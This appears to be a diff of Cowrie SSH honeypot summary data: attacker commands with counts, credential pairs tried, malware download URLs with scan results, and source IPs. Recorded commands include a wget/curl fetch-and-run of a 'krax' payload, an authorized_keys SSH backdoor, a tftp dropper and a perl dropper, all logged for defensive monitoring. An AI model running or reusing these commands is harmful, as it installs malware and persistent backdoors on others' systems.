-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "input": "lscpu | grep Model",
       "count": 1
     }
   ],
@@ -8085,7 +8085,7 @@
       "count": 316
     },
     {
-      "input": "w",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 315
     },
     {
@@ -8093,7 +8093,7 @@
       "count": 315
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "w",
       "count": 315
     }
   ],
@@ -8103,19 +8103,19 @@
       "count": 311
     },
     {
-      "input": "scp -t /var/tmp/clamav.pl",
-      "count": 7
-    },
-    {
       "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
       "count": 7
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
-      "count": 4
+      "input": "scp -t /var/tmp/clamav.pl",
+      "count": 7
     },
     {
       "input": "free -m",
+      "count": 4
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 4
     }
   ],
@@ -8259,11 +8259,7 @@
       "count": 977
     },
     {
-      "input": "which ls",
-      "count": 972
-    },
-    {
-      "input": "crontab -l",
+      "input": "uname -m",
       "count": 972
     },
     {
@@ -8271,7 +8267,11 @@
       "count": 972
     },
     {
-      "input": "uname -m",
+      "input": "crontab -l",
+      "count": 972
+    },
+    {
+      "input": "which ls",
       "count": 972
     }
   ],
@@ -8285,7 +8285,7 @@
       "count": 4
     },
     {
-      "input": "cat /etc/issue; hive-passwd wazg0d1s23",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Test123",
       "count": 2
     },
     {
@@ -8293,7 +8293,7 @@
       "count": 2
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Test123",
+      "input": "cat /etc/issue; hive-passwd wazg0d1s23",
       "count": 2
     }
   ],
@@ -8353,11 +8353,11 @@
   ],
   "file_download": [
     {
-      "url": "http://198.98.56.65/krax",
-      "outfile": "var/lib/cowrie/downloads/7bb8676c080c07af8274de5a4bb7db2c0c120e6606764d0186fa71b7026da56b",
+      "url": "http://209.141.58.203/ssh",
+      "outfile": "var/lib/cowrie/downloads/a62b74c34b7ddec13357700630e8ac4c5cff5fdc2dfdb8cd809216a7273bee39",
       "scans": {
-        "positives": 26,
-        "total": 60
+        "positives": 24,
+        "total": 59
       },
       "count": 1
     },
@@ -8371,11 +8371,11 @@
       "count": 1
     },
     {
-      "url": "http://209.141.58.203/ssh",
-      "outfile": "var/lib/cowrie/downloads/a62b74c34b7ddec13357700630e8ac4c5cff5fdc2dfdb8cd809216a7273bee39",
+      "url": "http://198.98.56.65/krax",
+      "outfile": "var/lib/cowrie/downloads/7bb8676c080c07af8274de5a4bb7db2c0c120e6606764d0186fa71b7026da56b",
       "scans": {
-        "positives": 24,
-        "total": 59
+        "positives": 26,
+        "total": 60
       },
       "count": 1
     }
@@ -8456,7 +8456,7 @@
       "count": 321
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "input": "uname -a",
       "count": 317
     },
     {
@@ -8464,7 +8464,7 @@
       "count": 317
     },
     {
-      "input": "uname -a",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
       "count": 317
     },
     {
@@ -8550,11 +8550,11 @@
   ],
   "file_download": [
     {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/b9543100161354cea7e20d25511c94af10e1caa7e39e0510c4136d3f7368813a",
+      "url": "http://205.185.126.121/sensi.sh",
+      "outfile": "var/lib/cowrie/downloads/6c2e7d215da450abbab696260e633ebaaa7d7248448e14dd65b06449b8b1073d",
       "scans": {
-        "positives": 0,
-        "total": 57
+        "positives": 29,
+        "total": 51
       },
       "count": 1
     },
@@ -8568,11 +8568,11 @@
       "count": 1
     },
     {
-      "url": "http://205.185.126.121/sensi.sh",
-      "outfile": "var/lib/cowrie/downloads/6c2e7d215da450abbab696260e633ebaaa7d7248448e14dd65b06449b8b1073d",
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/b9543100161354cea7e20d25511c94af10e1caa7e39e0510c4136d3f7368813a",
       "scans": {
-        "positives": 29,
-        "total": 51
+        "positives": 0,
+        "total": 57
       },
       "count": 1
     }
@@ -8656,7 +8656,7 @@
       "count": 77
     },
     {
-      "input": "uname",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 76
     },
     {
@@ -8664,7 +8664,7 @@
       "count": 76
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "uname",
       "count": 76
     }
   ],
@@ -8752,15 +8752,15 @@
       "count": 1027
     },
     {
-      "src_ip": "5.188.87.57",
-      "dst_ip": "ya.ru",
-      "dst_port": 80,
-      "count": 944
-    },
-    {
       "src_ip": "5.188.86.210",
       "dst_ip": "47.43.26.7",
       "dst_port": 25,
+      "count": 944
+    },
+    {
+      "src_ip": "5.188.87.57",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
       "count": 944
     },
     {
@@ -8843,11 +8843,11 @@
       "count": 2
     },
     {
-      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "input": "cat /proc/cpuinfo",
       "count": 1
     },
     {
-      "input": "cat /proc/cpuinfo",
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
       "count": 1
     }
   ],
@@ -8984,11 +8984,11 @@
       "count": 621
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
       "count": 620
     },
     {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 620
     },
     {
@@ -9010,11 +9010,11 @@
       "count": 3
     },
     {
-      "input": "echo Hi | cat -n",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
       "count": 2
     },
     {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "echo Hi | cat -n",
       "count": 2
     }
   ],
@@ -9075,16 +9075,16 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/8987cbf70f747d63bacaeed246c86b6b80456109bff8a9877e3985287e4c2530",
+      "outfile": "var/lib/cowrie/downloads/a58f1a1fd7a418f0167fb58799a31ac85b836882b4a0518f3b8e893af6a0c931",
       "scans": {
         "positives": 0,
-        "total": 56
+        "total": 58
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/a8665d711ed4c5485c5f5739fc1b2e3abd53a27bc22fce7b21c964c361ab9a9f",
+      "outfile": "var/lib/cowrie/downloads/9d58a1bcd003eb316bbc6a179c775b6630e8a44d930ff9a5befd72e1e1f0e7c9",
       "scans": {
         "positives": null,
         "total": null
@@ -9102,7 +9102,7 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/9d58a1bcd003eb316bbc6a179c775b6630e8a44d930ff9a5befd72e1e1f0e7c9",
+      "outfile": "var/lib/cowrie/downloads/a8665d711ed4c5485c5f5739fc1b2e3abd53a27bc22fce7b21c964c361ab9a9f",
       "scans": {
         "positives": null,
         "total": null
@@ -9111,10 +9111,10 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/a58f1a1fd7a418f0167fb58799a31ac85b836882b4a0518f3b8e893af6a0c931",
+      "outfile": "var/lib/cowrie/downloads/8987cbf70f747d63bacaeed246c86b6b80456109bff8a9877e3985287e4c2530",
       "scans": {
         "positives": 0,
-        "total": 58
+        "total": 56
       },
       "count": 1
     }
@@ -9363,7 +9363,7 @@
       "count": 72
     },
     {
-      "input": "which ls",
+      "input": "w",
       "count": 71
     },
     {
@@ -9371,7 +9371,7 @@
       "count": 71
     },
     {
-      "input": "w",
+      "input": "which ls",
       "count": 71
     }
   ],
@@ -9389,11 +9389,11 @@
       "count": 6
     },
     {
-      "input": "rm -rf /var/tmp/dota*",
+      "input": "echo Hi | cat -n",
       "count": 3
     },
     {
-      "input": "echo Hi | cat -n",
+      "input": "rm -rf /var/tmp/dota*",
       "count": 3
     }
   ],
@@ -9454,10 +9454,10 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/24bc8111316443c325a4d30ebb6dddb5a5622a7cf199cd2bd7701bf7fc8c294a",
+      "outfile": "var/lib/cowrie/downloads/51681bfeaaf1877a83c181a5ac6c6c06e01da96dd10c16f1b950ac9bae3b9dce",
       "scans": {
         "positives": 0,
-        "total": 57
+        "total": 58
       },
       "count": 1
     },
@@ -9472,10 +9472,10 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/51681bfeaaf1877a83c181a5ac6c6c06e01da96dd10c16f1b950ac9bae3b9dce",
+      "outfile": "var/lib/cowrie/downloads/24bc8111316443c325a4d30ebb6dddb5a5622a7cf199cd2bd7701bf7fc8c294a",
       "scans": {
         "positives": 0,
-        "total": 58
+        "total": 57
       },
       "count": 1
     }
@@ -9563,7 +9563,7 @@
       "count": 699
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
       "count": 698
     },
     {
@@ -9571,7 +9571,7 @@
       "count": 698
     },
     {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
       "count": 698
     }
   ],
@@ -9654,19 +9654,19 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/9c0e52f13cdfb72e27657f6530526c1fdb2f3df203f27a64a209d6b06102b8b7",
+      "outfile": "var/lib/cowrie/downloads/c179d6c178aa2497913491dacae90ac9d1e0e3be9be73ae1fb92fd64b9bc933b",
       "scans": {
-        "positives": 0,
-        "total": 58
+        "positives": null,
+        "total": null
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/c179d6c178aa2497913491dacae90ac9d1e0e3be9be73ae1fb92fd64b9bc933b",
+      "outfile": "var/lib/cowrie/downloads/9c0e52f13cdfb72e27657f6530526c1fdb2f3df203f27a64a209d6b06102b8b7",
       "scans": {
-        "positives": null,
-        "total": null
+        "positives": 0,
+        "total": 58
       },
       "count": 1
     }
@@ -9746,11 +9746,7 @@
       "count": 313
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
-      "count": 310
-    },
-    {
-      "input": "top",
+      "input": "lscpu | grep Model",
       "count": 310
     },
     {
@@ -9758,7 +9754,11 @@
       "count": 310
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
+      "count": 310
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 310
     }
   ],
@@ -9840,20 +9840,20 @@
   ],
   "file_download": [
     {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/1ff433296144edc59b546f9a7eb69523fdc8c8fb54ea8bf19622d61e6c3f0929",
-      "scans": {
-        "positives": 0,
-        "total": 58
-      },
-      "count": 1
-    },
-    {
       "url": "http://198.98.56.65/krax",
       "outfile": "var/lib/cowrie/downloads/661df0b02e799d3a5bf904ff5a18f79706115c73da84e89153a4e9791b4d8786",
       "scans": {
         "positives": 26,
         "total": 57
+      },
+      "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/1ff433296144edc59b546f9a7eb69523fdc8c8fb54ea8bf19622d61e6c3f0929",
+      "scans": {
+        "positives": 0,
+        "total": 58
       },
       "count": 1
     }
@@ -9937,7 +9937,7 @@
       "count": 1315
     },
     {
-      "input": "crontab -l",
+      "input": "uname -m",
       "count": 1312
     },
     {
@@ -9945,7 +9945,7 @@
       "count": 1312
     },
     {
-      "input": "uname -m",
+      "input": "crontab -l",
       "count": 1312
     }
   ],
@@ -10078,13 +10078,13 @@
       "count": 15
     },
     {
-      "username": "root",
-      "password": "root",
+      "username": "minerstat",
+      "password": "msos",
       "count": 11
     },
     {
-      "username": "minerstat",
-      "password": "msos",
+      "username": "root",
+      "password": "root",
       "count": 11
     }
   ],
@@ -10102,11 +10102,11 @@
       "count": 7
     },
     {
-      "input": "uname -a",
+      "input": "cat /proc/cpuinfo",
       "count": 3
     },
     {
-      "input": "cat /proc/cpuinfo",
+      "input": "uname -a",
       "count": 3
     }
   ],
@@ -10124,11 +10124,11 @@
       "count": 7
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "input": "cat /proc/cpuinfo",
       "count": 2
     },
     {
-      "input": "cat /proc/cpuinfo",
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 2
     }
   ],
@@ -10270,7 +10270,7 @@
       "count": 270
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "lscpu | grep Model",
       "count": 265
     },
     {
@@ -10278,7 +10278,7 @@
       "count": 265
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 265
     }
   ],
@@ -10361,19 +10361,19 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/c4c1ed48e8e425c7361bdcf0f849f2681b680c002f018f29483e8dd9e6ffef70",
+      "outfile": "var/lib/cowrie/downloads/d96aafd30b979ddb8ef73afd2a28fb430897dad02b154c81dd2fb85e74ad3e01",
       "scans": {
         "positives": 0,
-        "total": 57
+        "total": 58
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/d96aafd30b979ddb8ef73afd2a28fb430897dad02b154c81dd2fb85e74ad3e01",
+      "outfile": "var/lib/cowrie/downloads/c4c1ed48e8e425c7361bdcf0f849f2681b680c002f018f29483e8dd9e6ffef70",
       "scans": {
         "positives": 0,
-        "total": 58
+        "total": 57
       },
       "count": 1
     }
@@ -10461,11 +10461,11 @@
       "count": 277
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 276
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "lscpu | grep Model",
       "count": 276
     }
   ],
@@ -10479,11 +10479,11 @@
       "count": 15
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Admin123",
+      "input": "nproc ; uname -a ; history -c",
       "count": 4
     },
     {
-      "input": "nproc ; uname -a ; history -c",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Admin123",
       "count": 4
     },
     {
@@ -10629,7 +10629,7 @@
       "count": 529
     },
     {
-      "input": "uname -m",
+      "input": "top",
       "count": 528
     },
     {
@@ -10637,7 +10637,7 @@
       "count": 528
     },
     {
-      "input": "top",
+      "input": "uname -m",
       "count": 528
     }
   ],
@@ -10655,11 +10655,11 @@
       "count": 4
     },
     {
-      "input": "echo Hi | cat -n",
+      "input": "rm -rf /var/tmp/dota*",
       "count": 2
     },
     {
-      "input": "rm -rf /var/tmp/dota*",
+      "input": "echo Hi | cat -n",
       "count": 2
     }
   ],
@@ -10720,7 +10720,7 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/65bf973e110c2ea378557b9de29dc79aeb5dabd56bfc5ba108e484da7826d7a2",
+      "outfile": "var/lib/cowrie/downloads/bef2ffd433baac26dd200553b46fa20b2db3e24ea883cbe8d4d0927871a45cbd",
       "scans": {
         "positives": null,
         "total": null
@@ -10729,7 +10729,7 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/bef2ffd433baac26dd200553b46fa20b2db3e24ea883cbe8d4d0927871a45cbd",
+      "outfile": "var/lib/cowrie/downloads/65bf973e110c2ea378557b9de29dc79aeb5dabd56bfc5ba108e484da7826d7a2",
       "scans": {
         "positives": null,
         "total": null
@@ -10816,7 +10816,7 @@
       "count": 464
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
       "count": 461
     },
     {
@@ -10824,7 +10824,7 @@
       "count": 461
     },
     {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
       "count": 461
     }
   ],
@@ -10838,11 +10838,11 @@
       "count": 30
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "input": "free -m",
       "count": 5
     },
     {
-      "input": "free -m",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
       "count": 5
     },
     {
@@ -10889,12 +10889,12 @@
       "count": 781
     },
     {
-      "src_ip": "5.188.86.221",
+      "src_ip": "5.188.86.180",
       "robot": true,
       "count": 765
     },
     {
-      "src_ip": "5.188.86.180",
+      "src_ip": "5.188.86.221",
       "robot": true,
       "count": 765
     },
@@ -10973,11 +10973,7 @@
       "count": 574
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
-      "count": 569
-    },
-    {
-      "input": "top",
+      "input": "lscpu | grep Model",
       "count": 569
     },
     {
@@ -10985,7 +10981,11 @@
       "count": 569
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
+      "count": 569
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 569
     }
   ],
@@ -11003,11 +11003,11 @@
       "count": 12
     },
     {
-      "input": "echo Hi | cat -n",
+      "input": "cat /etc/issue; hive-passwd wazg0d1s23",
       "count": 2
     },
     {
-      "input": "cat /etc/issue; hive-passwd wazg0d1s23",
+      "input": "echo Hi | cat -n",
       "count": 2
     }
   ],
@@ -11068,7 +11068,25 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/e1bf5bac65a26240c722d5472c8cdf1172bbe1a9fbfcb9ffa0fe972584840915",
+      "outfile": "var/lib/cowrie/downloads/2d84abdc0c48cd190de3a13d746a24391ddc8d3ae51b74b13410f9c6fd21ed78",
+      "scans": {
+        "positives": 0,
+        "total": 57
+      },
+      "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/1130ad9e8bed843240babe12112145e0159f39663bf41d589d271c6155cba4fc",
+      "scans": {
+        "positives": 0,
+        "total": 57
+      },
+      "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/e974d412d6d12e4c856ae242128318f9b2ecde2ff5538790be0d045b0b1f5772",
       "scans": {
         "positives": null,
         "total": null
@@ -11086,28 +11104,10 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/e974d412d6d12e4c856ae242128318f9b2ecde2ff5538790be0d045b0b1f5772",
+      "outfile": "var/lib/cowrie/downloads/e1bf5bac65a26240c722d5472c8cdf1172bbe1a9fbfcb9ffa0fe972584840915",
       "scans": {
         "positives": null,
         "total": null
-      },
-      "count": 1
-    },
-    {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/1130ad9e8bed843240babe12112145e0159f39663bf41d589d271c6155cba4fc",
-      "scans": {
-        "positives": 0,
-        "total": 57
-      },
-      "count": 1
-    },
-    {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/2d84abdc0c48cd190de3a13d746a24391ddc8d3ae51b74b13410f9c6fd21ed78",
-      "scans": {
-        "positives": 0,
-        "total": 57
       },
       "count": 1
     }
@@ -11167,12 +11167,12 @@
     },
     {
       "username": "root",
-      "password": "111111",
+      "password": "overlord",
       "count": 27
     },
     {
       "username": "root",
-      "password": "overlord",
+      "password": "111111",
       "count": 27
     },
     {
@@ -11183,11 +11183,11 @@
   ],
   "commands": [
     {
-      "input": "uname",
+      "input": "uname -a",
       "count": 258
     },
     {
-      "input": "uname -a",
+      "input": "uname",
       "count": 258
     },
     {
@@ -11195,11 +11195,11 @@
       "count": 253
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 252
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "lscpu | grep Model",
       "count": 252
     }
   ],
@@ -11352,7 +11352,7 @@
       "count": 459
     },
     {
-      "input": "ls -lh $(which ls)",
+      "input": "crontab -l",
       "count": 456
     },
     {
@@ -11360,7 +11360,7 @@
       "count": 456
     },
     {
-      "input": "crontab -l",
+      "input": "ls -lh $(which ls)",
       "count": 456
     }
   ],
@@ -11534,11 +11534,11 @@
       "count": 76
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 75
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "lscpu | grep Model",
       "count": 75
     }
   ],
@@ -11687,19 +11687,19 @@
       "count": 46832
     },
     {
-      "input": "uname -m",
-      "count": 354
-    },
-    {
       "input": "uname -a",
       "count": 354
     },
     {
-      "input": "lscpu | grep Model",
-      "count": 347
+      "input": "uname -m",
+      "count": 354
     },
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 347
+    },
+    {
+      "input": "lscpu | grep Model",
       "count": 347
     }
   ],
@@ -11713,7 +11713,7 @@
       "count": 347
     },
     {
-      "input": "id -u",
+      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
       "count": 7
